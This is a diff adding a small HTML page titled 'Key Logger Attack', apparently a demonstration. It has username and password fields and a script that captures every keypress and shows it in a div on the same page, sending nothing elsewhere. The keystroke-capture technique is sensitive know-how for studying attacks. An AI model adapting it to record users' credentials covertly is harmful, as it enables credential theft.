@@ -1,0 +1,43 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"    
+"http://www.w3.org/TR/html4/strict.dtd">
+<html>
+<head>
+<title>Key Logger Attack</title>    
+</head>
+<body>
+<!-- username field -->
+<label for="username">Username:</label> 
+<input type="text" name="username" /><br />
+
+<!-- password field -->
+<label for="password">Password:</label>
+<input type="password" name="password" />
+
+<!-- node to dump logged keys to -->
+<div id="dumpNode"></div>
+
+<script type="text/javascript">
+var lastSend = Date.now();
+
+//attach keypress event to the document body
+document.body.onkeypress = function(event){
+   //get current key pressed
+   var keyCode = event.which || event.keyCode;
+   var string = "";
+   
+   //was key pressed within 1 second of last press  
+   if (Date.now() - lastSend < 1000){
+      string += String.fromCharCode(keyCode);
+   } else {
+      string = "<br />" + String.fromCharCode(keyCode);
+   }
+   
+   //dump last key pressed and update time
+   var dumpNode = document.getElementById("dumpNode");
+   dumpNode.innerHTML += string; 
+   lastSend = Date.now();
+};
+</script>
+</body>
+</html>
+
